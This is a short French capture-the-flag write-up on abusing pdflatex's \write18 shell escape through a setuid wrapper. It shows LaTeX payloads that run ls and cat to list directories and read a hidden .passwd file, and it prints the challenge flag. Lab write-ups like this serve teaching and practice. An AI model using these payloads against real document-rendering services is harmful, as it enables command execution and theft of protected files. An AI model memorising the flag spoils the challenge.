# LaTeX - Command execution

## Description :
> Comme pour le premier challenge sur LaTeX, dans ce défi il faut exploiter l'exécution de `pdflatex` pour exécuter une commande.
> 
> Sur **gtfobins** on trouve le payload.

## Exploit : 
> Avec le payload suivant, il est possible d'exécuter une commande lors de la generation du **.pdf**
> 
> `\documentclass{article}\begin{document}\immediate\write18{<command>}\end{document}`
> 
> Puisqu'il y a un dossier **flag_is_here** dans le répertoire courant, on exécute la commande `ls` pour voir son contenu avec 
> 
> `\documentclass{article}\begin{document}\immediate\write18{/bin/ls /challenge/app-script/ch24/flag_is_here > /tmp/output_command}\end{document}`
> 
> Lors de l'exécution du wrapper **./setuid-wrapper**, le résultat de la commande sera stocké dans un fichier dans **/tmp**.
> 
> On trouve donc qu'il y a un autre dossier nommé **512cba42fe46c1f346996b51fa053b15fba17baefa038d434381aa68bba6**.
> 
> En répétant la commande `ls -al` dans ce dossier, on trouve finalement le fichier **.passwd**
> 
> Finalement, il suffit de construire un payload avec la commande `cat` pour afficher le contenu du flag.
> 
> `\documentclass{article}\begin{document}\immediate\write18{/bin/cat /challenge/app-script/ch24/flag_is_here/512cba42fe46c1f346996b51fa053b15fba17baefa038d434381aa68bba6/.passwd > /tmp/output_flag}\end{document}`
> 
> Le flag trouvé est : **LaTeX_wr1t3_18_a_us3ful_c0mm4nd_3x3cut10n**